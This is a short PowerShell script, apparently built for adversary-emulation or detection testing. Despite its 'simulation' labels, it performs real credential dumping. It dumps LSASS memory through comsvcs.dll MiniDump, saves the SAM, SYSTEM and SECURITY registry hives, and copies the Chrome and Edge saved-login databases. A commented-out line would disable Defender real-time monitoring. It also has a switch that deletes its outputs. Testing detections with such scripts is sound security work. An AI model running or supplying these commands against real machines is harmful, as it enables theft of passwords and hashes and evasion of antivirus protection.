param(
    [string]$OutputPath = "$env:TEMP",
    [switch]$CleanUp
)

if($CleanUp) {
    
    $folderPath = "$OutputPath\LSASSdump"
    Remove-Item -Path $folderPath -Recurse -Force

    $folderPath = "$OutputPath\SAPdump"
    Remove-Item -Path $folderPath -Recurse -Force

    $folderPath = "$OutputPath\BrowserDump"
    Remove-Item -Path $folderPath -Recurse -Force
}
else {
    # Perform LSASS Dumping Attempt
    Write-Host "Running LSASS Simulation"
    $folderPath = "$OutputPath\LSASSdump"
    New-Item -Path $folderPath -ItemType Directory
    #Set-MpPreference -DisableRealtimeMonitoring $true -ExclusionPath $folderPath
    $lsassPID = (Get-Process -Name lsass).Id
    cmd.exe /C "C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPID $folderPath\out.dmp full"

    # SAM Dumping
    Write-Host "Running SAM Dumping Simulation"
    $folderPath = "$OutputPath\SAPdump"
    New-Item -Path $folderPath -ItemType Directory
    reg save HKLM\sam "$folderPath\sam" /y
    reg save HKLM\system "$folderPath\system" /y
    reg save HKLM\security "$folderPath\security" /y

    # Browsesr Credential Dumping
    Write-Host "Running BrowserDump Simulation"
    $folderPath = "$OutputPath\BrowserDump"
    New-Item -Path $folderPath -ItemType Directory
    esentutl.exe /y "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" /d "$folderPath\Chrome_Login_Data.tmp"
    esentutl.exe /y "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data For Account" /d "$folderPath\Chrome_Login_DataForAccount.tmp"
    esentutl.exe /y "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data" /d "$folderPath\Edge_Login_Data.tmp"
}